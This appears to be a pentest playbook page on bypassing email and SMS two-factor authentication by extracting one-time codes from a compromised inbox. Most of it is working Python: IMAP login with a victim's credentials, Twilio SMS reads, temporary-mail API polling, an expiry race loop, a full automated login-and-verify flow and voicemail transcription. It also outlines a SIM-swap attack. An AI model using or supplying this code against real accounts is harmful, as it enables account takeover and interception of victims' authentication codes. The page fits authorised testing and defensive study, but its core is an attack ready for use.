# 2FA — Email / SMS OTP Automated Extraction

## When this applies

- You have access to the user's email/SMS inbox (compromised credentials, IMAP access, voicemail box).
- The 2FA delivery is via email or SMS.
- Goal: automate retrieval of the OTP code in the brief window before it expires.

## Technique

Connect to the inbox via IMAP / disposable email / Twilio API / etc. Poll for new messages from the OTP sender. Extract the 6-digit code with a regex. Submit immediately while the code is still valid.

## Steps

### 1. IMAP-based extraction

```python
import imaplib, email, re
from datetime import datetime, timedelta

def extract_otp_from_email(address, password, sender, server='imap.gmail.com'):
    mail = imaplib.IMAP4_SSL(server)
    mail.login(address, password)
    mail.select('inbox')

    # Search recent emails from sender
    since = (datetime.now() - timedelta(minutes=2)).strftime('%d-%b-%Y')
    typ, data = mail.search(None, f'(FROM "{sender}" SINCE {since})')

    for num in data[0].split():
        typ, msg_data = mail.fetch(num, '(RFC822)')
        msg = email.message_from_bytes(msg_data[0][1])
        body = ''
        if msg.is_multipart():
            for part in msg.walk():
                if part.get_content_type() == 'text/plain':
                    body += part.get_payload(decode=True).decode()
        else:
            body = msg.get_payload(decode=True).decode()

        m = re.search(r'\b(\d{6})\b', body)
        if m:
            return m.group(1)
    return None

otp = extract_otp_from_email('victim@gmail.com', 'app_password',
                              'noreply@target.com')
```

### 2. Twilio SMS extraction

```python
from twilio.rest import Client
import re

client = Client(account_sid, auth_token)
messages = client.messages.list(to='+1234567890', limit=10)

for m in messages:
    match = re.search(r'\b(\d{6})\b', m.body)
    if match:
        print(f"OTP: {match.group(1)}")
```

### 3. Disposable / temporary email services

Tools that accept incoming email and provide an API:
- Mailosaur
- Guerilla Mail
- Mailinator (paid API for retrieval)
- 10MinuteMail (no API; manual)
- TempMail.org

```python
import requests

# Mailosaur example
r = requests.get(
    f'https://mailosaur.com/api/messages?server={server_id}',
    auth=(api_key, '')
)
messages = r.json()['items']
for m in messages:
    if 'noreply@target.com' in m['from'][0]['email']:
        body = m['text']['body']
        match = re.search(r'\b(\d{6})\b', body)
        if match:
            print(f"OTP: {match.group(1)}")
```

### 4. Polling loop (race against expiration)

```python
import time

def wait_for_otp(timeout=120, interval=5):
    start = time.time()
    while time.time() - start < timeout:
        otp = extract_otp_from_email(...)
        if otp:
            return otp
        time.sleep(interval)
    return None

# Usage
trigger_otp_send()       # Send OTP request to target
otp = wait_for_otp()
if otp:
    verify_2fa(otp)
```

### 5. End-to-end automated flow

```python
def auto_2fa_flow(username, password):
    # Step 1: Login (triggers OTP)
    session = requests.Session()
    session.post('/login', data={'username':username,'password':password})

    # Step 2: Wait for OTP arrival
    otp = wait_for_otp(timeout=60)
    if not otp:
        raise Exception("OTP not received")

    # Step 3: Submit OTP
    r = session.post('/verify-2fa', json={'username':username,'otp':otp})
    if r.status_code == 200:
        return session
    raise Exception("Verification failed")
```

### 6. Voicemail extraction (rare but possible)

If 2FA delivers via phone call (voice OTP), and you have voicemail access, transcribe the audio:

```python
# Voicemail audio → speech-to-text → regex
import speech_recognition as sr
r = sr.Recognizer()
with sr.AudioFile('voicemail.wav') as src:
    audio = r.record(src)
text = r.recognize_google(audio)
match = re.search(r'\b(\d{6})\b', text)
```

### 7. SIM swap (out of scope for most engagements)

Carrier-level attack: convince the carrier to port the victim's number to attacker's SIM. SMS/voice OTPs go to attacker's phone. Requires social engineering of carrier — usually OUT OF SCOPE for application pentests but a known real-world threat.

## Verifying success

- Extracted code matches the legitimate code visible to the recipient (when both can be checked).
- Subsequent verify-2fa request returns 200.
- Session is fully authenticated.

## Common pitfalls

- IMAP requires app-password (Gmail) or specific permissions; OAuth-based mailbox access is more common today.
- Polling latency may cause the OTP to expire before submission — keep poll interval short.
- Some apps use unique OTP delivery channels per session — make sure you're reading the right inbox.
- 2FA via TOTP (authenticator app) is NOT extractable this way — different attack class.
- Email client preprocessing (Gmail's automatic spam filtering) may delay delivery.

## Tools

- `imaplib` (Python stdlib) for IMAP.
- Twilio API for SMS.
- Mailosaur, MailHog for testing inboxes.
- Custom Python with `requests` + polling.
